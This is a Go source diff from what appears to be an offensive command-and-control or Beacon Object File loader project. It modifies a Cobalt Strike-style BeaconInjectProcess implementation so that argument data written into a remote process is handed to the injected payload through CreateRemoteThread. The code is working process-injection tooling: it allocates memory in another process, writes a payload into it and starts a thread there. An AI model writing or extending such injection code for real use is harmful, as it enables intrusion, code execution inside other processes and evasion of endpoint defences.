@@ -231,9 +231,11 @@ func remoteCreateThread(hProc windows.Handle, entry, param uintptr) uintptr {
 
 // beaconInjectProcessImpl: CS fork-and-run default model. VirtualAllocEx
 // + WriteProcessMemory + CreateRemoteThread on the host process handle.
-// We honour p_offset by stepping the thread entry; the optional arg blob
-// is appended after the payload so BOF authors using a known convention
-// (look at payload_end) can pick it up.
+// We honour p_offset by stepping the thread entry; the arg blob is
+// written immediately after the payload and its remote address is
+// passed as lpParameter to CreateRemoteThread — matching the CS BOF
+// entry convention `void go(char *args, int len)` where the remote
+// thread receives args via its first register/stack slot.
 //
 // Signature: void BeaconInjectProcess(HANDLE hProc, int pid, char *payload,
 //                                     int p_len, int p_offset,
@@ -256,13 +258,19 @@ func beaconInjectProcessImpl(
 	); err != nil {
 		return 0
 	}
+	var remoteArg uintptr
 	if argLen != 0 && argPtr != 0 {
+		remoteArg = remote + uintptr(payloadLen)
 		_ = windows.WriteProcessMemory(
-			windows.Handle(hProc), remote+uintptr(payloadLen),
+			windows.Handle(hProc), remoteArg,
 			(*byte)(unsafe.Pointer(argPtr)), uintptr(argLen), nil,
 		)
 	}
-	if remoteCreateThread(windows.Handle(hProc), remote+uintptr(payloadOffset), 0) == 0 {
+	// lpParameter = remote address of the arg blob (or 0 when no arg).
+	// CS BOFs entry signature is `void go(char *args, int len)`; the
+	// Windows x64 calling convention passes `args` in RCX which
+	// CreateRemoteThread populates from lpParameter.
+	if remoteCreateThread(windows.Handle(hProc), remote+uintptr(payloadOffset), remoteArg) == 0 {
 		return 0
 	}
 	return 1
